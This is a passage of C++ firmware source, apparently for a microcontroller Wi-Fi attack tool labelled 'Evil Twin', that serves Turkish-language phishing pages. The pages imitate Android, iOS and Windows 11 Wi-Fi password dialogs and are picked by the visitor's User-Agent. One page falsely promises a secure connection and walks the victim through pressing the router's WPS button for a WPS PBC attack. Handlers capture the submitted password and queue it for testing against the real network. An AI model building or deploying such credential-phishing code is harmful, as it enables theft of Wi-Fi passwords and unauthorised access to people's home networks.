      "<path d='M55 108 L55 118 L50 113 M55 118 L60 113' "
        "stroke='#f39c12' stroke-width='2' fill='none' stroke-linecap='round'/>"
      // Etiket
      "<text x='55' y='128' text-anchor='middle' fill='#f39c12' "
        "font-size='7' font-weight='bold' font-family='Arial'>WPS TU&#350;U</text>"
      // Anten gösterimi
      "<rect x='40' y='2' width='4' height='10' rx='2' fill='#7f8c8d'/>"
      "<rect x='66' y='2' width='4' height='10' rx='2' fill='#7f8c8d'/>"
    "</svg>"
    "<div class='diag-lbl'>Dikey Modem<br>(&#214;ndeki Tu&#351;)</div>"
    "</div>"

    // Diyagram 2: Yatay router (ASUS/Linksys/TP-Link tipi) — WPS yanda
    "<div class='diag-wrap'>"
    "<svg width='140' height='90' viewBox='0 0 140 90' xmlns='http://www.w3.org/2000/svg'>"
      // Router gövdesi
      "<rect x='10' y='25' width='110' height='52' rx='8' fill='#2c3e50'/>"
      "<rect x='14' y='29' width='102' height='44' rx='6' fill='#34495e'/>"
      // LED ışıklar (sol taraf)
      "<circle cx='24' cy='40' r='3' fill='#2ecc71'/>"
      "<circle cx='24' cy='50' r='3' fill='#2ecc71'/>"
      "<circle cx='24' cy='60' r='3' fill='#f39c12' opacity='0.7'/>"
      // Antenler
      "<rect x='20' y='5' width='5' height='22' rx='2.5' fill='#7f8c8d'"
        " transform='rotate(-10 22 16)'/>"
      "<rect x='115' y='5' width='5' height='22' rx='2.5' fill='#7f8c8d'"
        " transform='rotate(10 117 16)'/>"
      // WPS tuşu (sağ yan)
      "<rect x='100' y='36' width='18' height='30' rx='5' fill='#1565c0'"
        " style='filter:drop-shadow(0 0 5px #42a5f5)'/>"
      "<text x='109' y='54' text-anchor='middle' fill='white' "
        "font-size='6' font-weight='bold' font-family='Arial' "
        "transform='rotate(90 109 54)'>WPS</text>"
      // Ok - WPS tuşuna
      "<path d='M122 51 L132 51 L128 47 M132 51 L128 55' "
        "stroke='#f39c12' stroke-width='2' fill='none' stroke-linecap='round'/>"
      "<text x='130' y='66' text-anchor='middle' fill='#f39c12' "
        "font-size='6.5' font-weight='bold' font-family='Arial'>WPS</text>"
    "</svg>"
    "<div class='diag-lbl'>Yatay Router<br>(Yan Ta&#351;&#305;ndaki Tu&#351;)</div>"
    "</div>"

    // Diyagram 3: Küçük boxy modem (Sagemcom/Arcadyan tipi) — WPS arkada
    "<div class='diag-wrap'>"
    "<svg width='100' height='90' viewBox='0 0 100 90' xmlns='http://www.w3.org/2000/svg'>"
      // Modem gövdesi (boxy)
      "<rect x='15' y='20' width='70' height='55' rx='6' fill='#2c3e50'/>"
      "<rect x='19' y='24' width='62' height='47' rx='4' fill='#34495e'/>"
      // LED
      "<circle cx='30' cy='35' r='3' fill='#2ecc71'/>"
      "<circle cx='40' cy='35' r='3' fill='#2ecc71'/>"
      "<circle cx='50' cy='35' r='3' fill='#2ecc71'/>"
      // WPS tuşu (önde)
      "<rect x='28' y='52' width='44' height='12' rx='6' fill='#1565c0'"
        " style='filter:drop-shadow(0 0 4px #42a5f5)'/>"
      "<text x='50' y='61.5' text-anchor='middle' fill='white' "
        "font-size='7' font-weight='bold' font-family='Arial'>WPS</text>"
      // Ok
      "<path d='M50 75 L50 83 L46 79 M50 83 L54 79' "
        "stroke='#f39c12' stroke-width='1.8' fill='none' stroke-linecap='round'/>"
      // Etiket
      "<text x='50' y='90' text-anchor='middle' fill='#f39c12' "
        "font-size='6.5' font-weight='bold' font-family='Arial'>WPS TU&#350;U</text>"
      // Anten
      "<rect x='45' y='10' width='4' height='14' rx='2' fill='#7f8c8d'/>"
    "</svg>"
    "<div class='diag-lbl'>Kare Modem<br>(&#214;ndeki Tu&#351;)</div>"
    "</div>"

  "</div>"); // .modem-diagrams

  // ── Adım Adım Talimatlar ─────────────────────────────────────────────────
  h += F("<div class='wps-steps'>"

    "<div class='ws'>"
      "<div class='ws-num'>1</div>"
      "<div class='ws-txt'>"
        "<b>Modemin/router&#305;n&#305;z&#305; bulun.</b>"
        "<span class='note'>Genellikle TV&#39;nin veya bilgisayar&#305;n yak&#305;n&#305;nda bulunur.</span>"
      "</div>"
    "</div>"

    "<div class='ws'>"
      "<div class='ws-num'>2</div>"
      "<div class='ws-txt'>"
        "<b>&#220;zerindeki <span style='color:#1565c0'>WPS</span> yaz&#305;l&#305; tu&#351;u bulun.</b>"
        "<span class='note'>&#214;n y&#252;zde, yan y&#252;zde veya arkada olabilir."
        " Genellikle k&#252;&#231;&#252;k, bas&#305;labilir bir tu&#351;tur.</span>"
      "</div>"
    "</div>"

    "<div class='ws'>"
      "<div class='ws-num'>3</div>"
      "<div class='ws-txt'>"
        "<b>WPS tu&#351;una <span style='color:#e74c3c'>3&#8211;5 saniye</span> bas&#305;l&#305; tutun.</b>"
        "<span class='note'>Modemin LED &#305;&#351;&#305;&#287;&#305; yan&#305;p s&#246;nmeye ba&#351;lar"
        " — bu normaldir, ba&#287;lant&#305; kuruluyordur.</span>"
      "</div>"
    "</div>"

    "<div class='ws'>"
      "<div class='ws-num'>4</div>"
      "<div class='ws-txt'>"
        "<b>Bu sayfa otomatik olarak yeniden ba&#287;lanacakt&#305;r.</b>"
        "<span class='note'>Hi&#231;bir &#351;ey yapman&#305;za gerek yok,"
        " sayfa kendili&#287;inden g&#252;ncellenecek.</span>"
      "</div>"
    "</div>"

  "</div>"); // .wps-steps

  // ── WPS Bekleme Durumu ───────────────────────────────────────────────────
  h += F("<div class='wps-wait'>"
    "<div class='spin-sm'></div>"
    "<span>WPS ba&#287;lant&#305;s&#305; bekleniyor&#8230; Tu&#351;a bast&#305;ktan sonra"
    " otomatik tamamlanacak.</span>"
  "</div>"
  "</div></div>"); // .m-body .method

  // ══════════════════════════════════════════════════════════════════════════
  // AYRAÇ
  // ══════════════════════════════════════════════════════════════════════════
  h += F("<div class='or-div'>veya</div>");

  // ══════════════════════════════════════════════════════════════════════════
  // YÖNTEM 2 — Şifre ile Bağlan
  // ══════════════════════════════════════════════════════════════════════════
  h += F("<div class='method'>"
    "<div class='m-head pw'>"
      "<span style='font-size:22px'>&#128273;</span>"
      "<span class='m-head-title'>Y&#214;NTEM 2 &mdash; WiFi &#350;ifresi ile Ba&#287;lan</span>"
    "</div>"
    "<div class='m-body'>"
      "<p style='font-size:.85em;color:#555;margin-bottom:14px;line-height:1.55'>"
        "E&#287;er WPS tu&#351;u yoksa veya &#231;al&#305;&#351;m&#305;yorsa,"
        " WiFi &#351;ifrenizi girerek ba&#287;lanabilirsiniz."
        " &#350;ifre genellikle modemin alt&#305;nda veya yan&#305;nda yazar."
      "</p>"
      "<form method='post' action='/submit'>"
        "<div class='pw-field'>"
          "<input class='pw-inp' type='password' name='password' id='pw'"
            " placeholder='WiFi &#351;ifrenizi girin' autocomplete='off'>"
          "<button type='button' class='eye' onclick='togglePw()'>&#128065;</button>"
        "</div>"
        "<p class='pw-hint'>&#128161; &#350;ifre modem etiketinde veya kutusunda yazabilir</p>"
        "<button class='pw-btn' type='submit'>&#128275;&nbsp; Ba&#287;lan</button>"
      "</form>"
    "</div>"
  "</div>");

  // ── Footer ────────────────────────────────────────────────────────────────
  h += F("<p style='text-align:center;font-size:.72em;color:#bbb;margin-top:16px;line-height:1.6'>"
    "&#128274; Ba&#287;lant&#305;n&#305;z g&#252;venli protokol ile korunmaktad&#305;r.<br>"
    "Sorununuz devam ederse servis sa&#287;lay&#305;c&#305;n&#305;z&#305; aray&#305;n."
  "</p>"
  "</div>"  // .wrap
  "<script>"
    "function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}"
  "</script>"
  "</body></html>");

  return h;
}

// ─── WPS PBC Başarı Sayfası ───────────────────────────────────────────────────
static String portal_wps_success_page() {
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Ba&#287;land&#305;</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
      "background:#f0f2f5;color:#1a1a2e;min-height:100vh}"
    ".hdr{background:linear-gradient(90deg,#c0392b,#e74c3c);"
      "padding:14px 20px;display:flex;align-items:center;gap:12px;color:#fff}"
    ".hdr-ico{width:38px;height:38px;background:rgba(255,255,255,.2);"
      "border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px}"
    ".hdr-title{font-size:1em;font-weight:700}"
    ".wrap{max-width:400px;margin:32px auto;padding:0 16px}"
    ".card-ok{background:#fff;border-radius:16px;padding:36px 24px;text-align:center;"
      "box-shadow:0 2px 12px rgba(0,0,0,.10);border-top:5px solid #27ae60}"
    ".big-ico{font-size:64px;display:block;margin-bottom:16px}"
    "h1{color:#1e7e34;font-size:1.3em;margin-bottom:10px;font-weight:800}"
    "p{font-size:.9em;color:#555;line-height:1.65}"
    ".steps-ok{list-style:none;margin:20px 0 0;text-align:left}"
    ".steps-ok li{display:flex;align-items:center;gap:10px;padding:7px 0;"
      "border-bottom:1px solid #f0f2f5;font-size:.85em;color:#444}"
    ".steps-ok li:last-child{border-bottom:none}"
    ".ok-ico{color:#27ae60;font-size:18px;flex-shrink:0}"
    "</style></head><body>"
    "<div class='hdr'>"
      "<div class='hdr-ico'>&#128225;</div>"
      "<div><div class='hdr-title'>Ba&#287;lant&#305; Hizmetleri</div></div>"
    "</div>"
    "<div class='wrap'>"
      "<div class='card-ok'>"
        "<span class='big-ico'>&#9989;</span>"
        "<h1>Ba&#287;lant&#305;n&#305;z Yenilendi!</h1>"
        "<p>&#304;nternet ba&#287;lant&#305;n&#305;z ba&#351;ar&#305;yla do&#287;ruland&#305;."
           " Birka&#231; saniye i&#231;inde otomatik olarak ba&#287;lanacaks&#305;n&#305;z.</p>"
        "<ul class='steps-ok'>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>A&#287; g&#252;venli&#287;i do&#287;ruland&#305;</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>Ba&#287;lant&#305; yenilendi</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>&#304;nternet eri&#351;imi aktif</span></li>"
        "</ul>"
      "</div>"
    "</div>"
    "</body></html>");
  return h;
}

// ─── Captive Portal (Evil Twin istemciler için) ───────────────────────────────
// UA tespiti: iPhone/iPad → iOS tasarımı, diğer → Android MD3 tasarımı
// Renk teması: prefers-color-scheme ile cihazdan otomatik alınır

static String portal_android(bool wrong_pass, const String &ssid) {
  // Material Design 3 — ekran görüntüsündeki Android WiFi şifre ekranı
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
    "<title>");
  h += ssid;
  h += F("</title><style>"
    ":root{"
      "--bg:#1C1B1F;--surf:#2B2930;--on-bg:#E6E1E5;--outline:#938F99;"
      "--focus:#D0BCFF;--primary:#D0BCFF;--on-pri:#381E72;"
      "--hint:#938F99;--err:#F2B8B8;--sep:rgba(147,143,153,.3)"
    "}"
    "@media(prefers-color-scheme:light){"
      ":root{"
        "--bg:#FFFBFE;--surf:#F4EFF4;--on-bg:#1C1B1F;--outline:#79747E;"
        "--focus:#6750A4;--primary:#6750A4;--on-pri:#FFFFFF;"
        "--hint:#49454F;--err:#B3261E;--sep:rgba(121,116,126,.3)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:'Google Sans',Roboto,sans-serif;background:var(--bg);"
      "color:var(--on-bg);min-height:100vh;padding:16px 20px}"
    ".back{width:40px;height:40px;display:flex;align-items:center;justify-content:center;"
      "border-radius:50%;border:none;background:none;color:var(--on-bg);"
      "cursor:pointer;margin-bottom:28px;padding:0}"
    ".ssid{font-size:28px;font-weight:400;color:var(--on-bg);margin-bottom:36px;"
      "word-break:break-all;letter-spacing:-.2px}"
    ".field{position:relative;margin-bottom:4px}"
    ".finput{width:100%;height:56px;background:transparent;"
      "border:1px solid var(--outline);border-radius:4px;"
      "padding:16px 48px 0 16px;font-size:16px;color:var(--on-bg);"
      "outline:none;appearance:none;-webkit-appearance:none}"
    ".finput:focus{border:2px solid var(--focus)}"
    ".flabel{position:absolute;left:16px;top:50%;transform:translateY(-50%);"
      "font-size:16px;color:var(--outline);pointer-events:none;"
      "transition:all .15s ease;background:var(--bg);padding:0}"
    ".finput:focus~.flabel,.finput:not(:placeholder-shown)~.flabel{"
      "top:10px;transform:none;font-size:12px;color:var(--focus);padding:0 2px"
    "}"
    ".finput:not(:focus)~.flabel{color:var(--outline)}"
    ".eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--outline);"
      "padding:4px;line-height:0}"
    ".hint{font-size:12px;color:var(--hint);margin:4px 0 0 16px}"
    ".errtxt{font-size:12px;color:var(--err);margin:4px 0 0 16px}"
    ".btns{display:flex;justify-content:flex-end;gap:8px;margin-top:40px}"
    ".bcancel{height:40px;padding:0 24px;border-radius:20px;"
      "border:1px solid var(--outline);background:transparent;"
      "color:var(--on-bg);font-size:14px;font-family:inherit;cursor:pointer}"
    ".bconnect{height:40px;padding:0 24px;border-radius:20px;"
      "border:none;background:var(--primary);color:var(--on-pri);"
      "font-size:14px;font-family:inherit;font-weight:500;cursor:pointer}"
    "</style></head><body>"
    "<button class='back' onclick='history.back()'>"
      "<svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>"
        "<path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/>"
      "</svg>"
    "</button>"
    "<div class='ssid'>");
  h += ssid;
  h += F("</div>"
    "<p style='font-size:14px;color:var(--hint);margin:-20px 0 22px;line-height:1.5'>"
      "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
      "<br><span style='font-size:12px;opacity:.7'>"
        "Etikette &ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; yaz&#305;yor olabilir."
      "</span>"
    "</p>");

  h += F("<form method='post' action='/submit' id='f'>"
    "<div class='field'>"
      "<input class='finput' type='password' name='password' id='pw' placeholder=' ' autocomplete='off'>"
      "<label class='flabel' for='pw'>Kablosuz a&#287; &#351;ifresi</label>"
      "<button type='button' class='eye' onclick='togglePw()'>"
        "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
          "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
          "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
        "</svg>"
      "</button>"
    "</div>");
  if (wrong_pass) {
    h += F("<p class='errtxt'>Yanl&#305;&#351; &#351;ifre. Tekrar deneyin.</p>");
  } else {
    h += F("<p class='hint'>*zorunlu</p>");
  }
  h += F("<div class='btns'>"
      "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
      "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
    "</div>"
    "</form>"
    "<p style='font-size:12px;color:var(--hint);text-align:center;"
      "margin-top:18px;padding:0 16px;line-height:1.5;opacity:.75'>"
      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
    "</p>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_ios(bool wrong_pass, const String &ssid) {
  // Apple iOS tarzı WiFi parola ekranı
  // Koyu/açık tema: prefers-color-scheme ile cihazdan alınır
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
    "<title>Parolay&#305; Gir</title><style>"
    ":root{"
      "--bg:#F2F2F7;--bg2:#FFFFFF;--text:#000;--text2:rgba(60,60,67,.6);"
      "--sep:rgba(60,60,67,.29);--tint:#007AFF;--ph:rgba(60,60,67,.3);"
      "--err:#FF3B30;--cell:#FFF"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#000;--bg2:#1C1C1E;--text:#FFF;--text2:rgba(235,235,245,.6);"
        "--sep:rgba(84,84,88,.6);--tint:#0A84FF;--ph:rgba(235,235,245,.3);"
        "--err:#FF453A;--cell:#1C1C1E"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;"
      "background:var(--bg);color:var(--text);min-height:100vh}"
    ".navbar{display:flex;align-items:center;justify-content:space-between;"
      "padding:13px 16px 8px;background:var(--bg)}"
    ".nav-cancel{color:var(--tint);font-size:17px;border:none;background:none;"
      "cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-title{font-size:17px;font-weight:600;color:var(--text);letter-spacing:-.4px}"
    ".nav-join{color:var(--tint);font-size:17px;font-weight:600;border:none;"
      "background:none;cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-join:disabled{opacity:.4}"
    ".content{padding:24px 16px 0;text-align:center}"
    ".wifi-ico{font-size:56px;margin-bottom:12px;line-height:1}"
    ".ssid-lbl{font-size:20px;font-weight:600;color:var(--text);margin-bottom:6px;"
      "word-break:break-all}"
    ".sub{font-size:13px;color:var(--text2);margin-bottom:28px;line-height:1.5;"
      "padding:0 8px}"
    ".err-box{background:var(--cell);border-radius:10px;padding:10px 16px;"
      "margin-bottom:12px;font-size:13px;color:var(--err);text-align:left}"
    ".cell-group{background:var(--cell);border-radius:10px;overflow:hidden;"
      "margin-bottom:8px}"
    ".cell{display:flex;align-items:center;height:44px;padding:0 12px;"
      "border-bottom:none}"
    ".cell-lbl{font-size:17px;color:var(--text);min-width:72px;flex-shrink:0}"
    ".cell-sep{width:100%;height:.5px;background:var(--sep);margin-left:12px}"
    ".cell-input{flex:1;border:none;background:transparent;font-size:17px;"
      "color:var(--text);outline:none;padding:0 8px;-webkit-appearance:none;"
      "font-family:inherit}"
    ".cell-input::placeholder{color:var(--ph)}"
    ".eye-ios{background:none;border:none;color:var(--text2);cursor:pointer;"
      "font-size:17px;padding:4px 0 4px 8px}"
    "</style></head><body>"
    "<div class='navbar'>"
      "<button class='nav-cancel' onclick='history.back()'>&#304;ptal</button>"
      "<span class='nav-title'>Parolay&#305; Gir</span>"
      "<button class='nav-join' form='f' type='submit' id='joinbtn' disabled>Kat&#305;l</button>"
    "</div>"
    "<div class='content'>"
      "<div class='wifi-ico'>&#128225;</div>"
      "<div class='ssid-lbl'>");
  h += ssid;
  h += F("</div>"
      "<div class='sub'>"
        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
        "<br><span style='font-size:11px;opacity:.65'>"
          "&ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
        "</span>"
      "</div>");

  if (wrong_pass) {
    h += F("<div class='err-box' style='margin:8px 16px 0'>&#128274; Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</div>");
  }
  h += F("<form id='f' method='post' action='/submit'>"
      "<div class='cell-group'>"
        "<div class='cell'>"
          "<span class='cell-lbl'>Kablosuz a&#287; &#351;ifresi</span>"
          "<input class='cell-input' type='password' name='password' id='pw'"
            " placeholder='Gerekli' autocomplete='off'"
            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
          "<button type='button' class='eye-ios' onclick='togglePw()'>&#128065;</button>"
        "</div>"
      "</div>"
    "</form>"
    "<p style='font-size:12px;color:var(--text2);text-align:center;"
      "margin:16px 16px 0;line-height:1.5;opacity:.7'>"
      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
    "</p>"
    "</div>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_desktop(bool wrong_pass, const String &ssid) {
  // Windows 11 WiFi bağlantı flyout'u tarzı — masaüstü tarayıcılar için
  // Koyu/açık tema: prefers-color-scheme ile otomatik
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Connect to ");
  h += ssid;
  h += F("</title><style>"
    ":root{"
      "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
      "--border:#E0E0E0;--input-bg:#FAFAFA;--input-border:#ABABAB;"
      "--accent:#0078D4;--accent-h:#006CBE;--btn-cancel-bg:#F0F0F0;"
      "--btn-cancel-h:#E5E5E5;--btn-cancel-txt:#1A1A1A;"
      "--shadow:rgba(0,0,0,.12);--err:#C42B1C;--err-bg:#FDE7E9"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#202020;--card:#2C2C2C;--text:#FFFFFF;--text2:#ABABAB;"
        "--border:#404040;--input-bg:#3C3C3C;--input-border:#606060;"
        "--accent:#60CDFF;--accent-h:#45C0F8;--btn-cancel-bg:#3C3C3C;"
        "--btn-cancel-h:#474747;--btn-cancel-txt:#FFFFFF;"
        "--shadow:rgba(0,0,0,.4);--err:#FF9494;--err-bg:#3D1A1A"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Segoe UI Variable','Segoe UI',system-ui,sans-serif;"
      "background:var(--bg);min-height:100vh;"
      "display:flex;align-items:center;justify-content:center;padding:20px}"
    ".card{background:var(--card);border:1px solid var(--border);"
      "border-radius:8px;padding:24px 28px 20px;"
      "width:100%;max-width:360px;"
      "box-shadow:0 4px 20px var(--shadow)}"
    ".top{display:flex;align-items:center;gap:12px;margin-bottom:18px}"
    ".wifi-icon{width:40px;height:40px;flex-shrink:0;"
      "display:flex;align-items:center;justify-content:center;"
      "background:var(--accent);border-radius:50%;color:#fff;font-size:20px}"
    ".top-text .ssid{font-size:14px;font-weight:600;color:var(--text);"
      "word-break:break-all;line-height:1.3}"
    ".top-text .sub{font-size:12px;color:var(--text2);margin-top:2px}"
    ".divider{border:none;border-top:1px solid var(--border);margin:0 -28px 18px}"
    ".field-label{font-size:12px;color:var(--text2);margin-bottom:5px;display:block}"
    ".field-wrap{position:relative;margin-bottom:6px}"
    ".field-input{width:100%;height:32px;background:var(--input-bg);"
      "border:1px solid var(--input-border);border-radius:4px;"
      "padding:0 36px 0 10px;font-size:13px;color:var(--text);"
      "font-family:inherit;outline:none}"
    ".field-input:focus{border-color:var(--accent);"
      "box-shadow:0 0 0 1px var(--accent)}"
    ".eye-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--text2);"
      "font-size:15px;padding:0;line-height:1;display:flex;align-items:center}"
    ".err-box{background:var(--err-bg);border-radius:4px;"
      "padding:8px 10px;margin-bottom:12px;"
      "font-size:12px;color:var(--err);display:flex;gap:6px;align-items:center}"
    ".hint{font-size:11px;color:var(--text2);margin-bottom:16px}"
    ".check-row{display:flex;align-items:center;gap:8px;margin-bottom:18px}"
    ".check-row input{width:14px;height:14px;accent-color:var(--accent);cursor:pointer}"
    ".check-row label{font-size:12px;color:var(--text2);cursor:pointer}"
    ".btn-row{display:flex;justify-content:flex-end;gap:8px}"
    ".btn{height:32px;padding:0 16px;border-radius:4px;"
      "font-size:13px;font-family:inherit;cursor:pointer;border:none;"
      "font-weight:400;letter-spacing:0}"
    ".btn-cancel{background:var(--btn-cancel-bg);color:var(--btn-cancel-txt);"
      "border:1px solid var(--border)}"
    ".btn-cancel:hover{background:var(--btn-cancel-h)}"
    ".btn-connect{background:var(--accent);color:#fff;font-weight:600}"
    "@media(prefers-color-scheme:dark){.btn-connect{color:#1A1A1A}}"
    ".btn-connect:hover{background:var(--accent-h)}"
    "</style></head><body>"
    "<div class='card'>"
      "<div class='top'>"
        "<div class='wifi-icon'>&#128225;</div>"
        "<div class='top-text'>"
          "<div class='ssid'>");
  h += ssid;
  h += F("</div>"
          "<div class='sub'>Kilitli &bull; Parola gerekli</div>"
        "</div>"
      "</div>"
      "<hr class='divider'>"
      "<p style='font-size:13px;color:var(--text2);margin-bottom:6px;line-height:1.5'>"
        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
      "</p>"
      "<p style='font-size:11px;color:var(--text2);margin-bottom:14px;opacity:.75'>"
        "&ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
      "</p>");

  if (wrong_pass) {
    h += F("<div class='err-box'>"
        "<span>&#9888;</span>"
        "<span>A&#287;&#305;n parolas&#305; yanl&#305;&#351;. Tekrar deneyin.</span>"
      "</div>");
  }
  h += F("<form method='post' action='/submit'>"
      "<label class='field-label' for='pw'>Kablosuz a&#287; &#351;ifresi</label>"
      "<div class='field-wrap'>"
        "<input class='field-input' type='password' name='password' id='pw'"
          " placeholder='Parolay&#305; girin' autocomplete='off'>"
        "<button type='button' class='eye-btn' onclick='togglePw()' title='G&#246;ster/Gizle'>"
          "<svg width='16' height='16' viewBox='0 0 24 24' fill='currentColor'>"
            "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
            "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
            "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
          "</svg>"
        "</button>"
      "</div>"
      "<p class='hint'>Parola en az 8 karakter olmal&#305;d&#305;r.</p>"
      "<div class='check-row'>"
        "<input type='checkbox' id='auto' checked>"
        "<label for='auto'>Bu a&#287;a otomatik ba&#287;lan</label>"
      "</div>"
      "<div class='btn-row'>"
        "<button type='button' class='btn btn-cancel' onclick='history.back()'>&#304;ptal</button>"
        "<button type='submit' class='btn btn-connect'>Ba&#287;lan</button>"
      "</div>"
    "</form>"
    "<p style='font-size:11px;color:var(--text2);text-align:center;"
      "margin-top:14px;line-height:1.5;opacity:.7'>"
      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
    "</p>"
    "</div>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_page(bool wrong_pass) {
  String ua = server.header("User-Agent");

  // iOS tespiti
  bool is_ios = ua.indexOf("iPhone") >= 0 ||
                ua.indexOf("iPad")   >= 0 ||
                ua.indexOf("iPod")   >= 0;
  if (is_ios) return portal_ios(wrong_pass, evil_twin_ssid);

  // Android tespiti (masaüstü UA'sında "Android" geçmez)
  bool is_android = ua.indexOf("Android") >= 0;
  if (is_android) return portal_android(wrong_pass, evil_twin_ssid);

  // Windows, macOS, Linux, ChromeOS vb. masaüstü / diğer
  return portal_desktop(wrong_pass, evil_twin_ssid);
}

static void handle_portal() {
  if (!evil_twin_active) { redirect_root(); return; }
  // WPS PBC başarılıysa başarı sayfasını göster
  if (et_wps_pbc_found) {
    server.send(200, "text/html", portal_wps_success_page());
    return;
  }
  // Her durumda platform-specific sayfayı göster (Android/iOS/Windows tarzı).
  // WPS PBC aktifse ilgili platform sayfası kendi WPS talimat kutusunu gösterir.
  server.send(200, "text/html", portal_page(false));
}

static void handle_portal_wrong() {
  if (!evil_twin_active) { redirect_root(); return; }
  server.send(200, "text/html", portal_page(true));
}

// /portal_manual → şifre formunu doğrudan göster (WPS fallback)
static void handle_portal_manual() {
  if (!evil_twin_active) { redirect_root(); return; }
  server.send(200, "text/html", portal_page(false));
}

// /wps_pbc_start → WPS PBC saldırısını başlat (yönetim sayfasından)
static void handle_wps_pbc_start() {
  if (!evil_twin_active) { redirect_root(); return; }
  et_start_wps_pbc();
  redirect_root();
}

// /wps_pbc_stop → WPS PBC durdur
static void handle_wps_pbc_stop() {
  et_stop_wps_pbc();
  redirect_root();
}

// ─── Submit: test durumu — main.cpp loop'tan erişilir (extern) ───────────────
bool   et_test_pending   = false;  // main loop testi çalıştırsın
bool   et_result_ready   = false;  // test tamamlandı
bool   et_result_correct = false;  // sonuç
String et_tested_ssid     = "";
String et_tested_password = "";

static void handle_submit() {
  if (!evil_twin_active) { redirect_root(); return; }

  String password = server.arg("password");
  password.trim();

  if (password.length() < 8) {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
    return;
  }

  // Durumu ayarla — main loop testi alır
  et_test_pending   = true;
  et_result_ready   = false;
  et_result_correct = false;
  et_tested_ssid    = evil_twin_ssid;
  et_tested_password = password;

  // Handler HEMEN döner — TCP flush garantisi için blocking YOK
  // Tarayıcı "test ediliyor" sayfasını alır, 12s sonra /test_result'a gider
  server.send(200, "text/html", F(
    "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='12; url=/test_result'>"
    "<title>Test Ediliyor...</title>"
    "<style>"
    "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
    ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
    "padding:36px 28px;max-width:320px;text-align:center}"
    ".spin{width:44px;height:44px;border:4px solid #30363d;"
    "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;"
    "margin:0 auto 20px}"
    "@keyframes s{to{transform:rotate(360deg)}}"
